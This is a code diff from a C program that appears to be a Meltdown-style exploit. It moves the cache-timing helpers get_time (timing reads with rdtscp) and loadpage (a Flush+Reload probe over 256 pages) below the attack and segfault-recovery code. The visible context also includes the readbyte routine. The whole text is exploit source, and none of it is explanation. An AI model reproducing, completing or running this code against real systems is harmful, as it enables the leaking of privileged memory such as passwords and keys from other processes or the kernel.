@@ -14,27 +14,6 @@ static void SegErrCatch(int sig){
 static inline void memoryaccess(void *p) {
   asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");//读取该字节
 }
-int get_time(volatile char *addr){ //获得读取内存的时间 
-    unsigned long long  time1,time2;
-    int t=0;
-    time1 = __rdtscp(&t);
-    memoryaccess(addr);
-    time2 = __rdtscp(&t);
-    return time2-time1;
-}
-int loadpage(){  //判断攻击位置
-    unsigned int volatile pagenum,ans,min=0xffffffff,time;
-    int i;
-    for (i=0;i<256;i++){
-        pagenum=((i * 167) + 13) & 255;
-        time=get_time(target+size*pagenum);
-        if (min>time){
-            min=time;
-            ans=pagenum;
-        }
-    }
-    return ans;   
-}
 int attack(char* addr) //核心代码
 {	
 	if(!sigsetjmp(Jump_Buffer,1)){
@@ -59,6 +38,28 @@ int attack(char* addr) //核心代码
 		return 0;
 	}
 }
+int get_time(volatile char *addr){ //获得读取内存的时间 
+    unsigned long long  time1,time2;
+    int t=0;
+    time1 = __rdtscp(&t);
+    memoryaccess(addr);
+    time2 = __rdtscp(&t);
+    return time2-time1;
+}
+int loadpage(){  //判断攻击位置
+    unsigned int volatile pagenum,ans,min=0xffffffff,time;
+    int i;
+    for (i=0;i<256;i++){
+        pagenum=((i * 167) + 13) & 255;
+        time=get_time(target+size*pagenum);
+        if (min>time){
+            min=time;
+            ans=pagenum;
+        }
+    }
+    return ans;   
+}
+
 void readbyte(int fd,char *addr){//读取内容
     static char buf[256];
     int i;
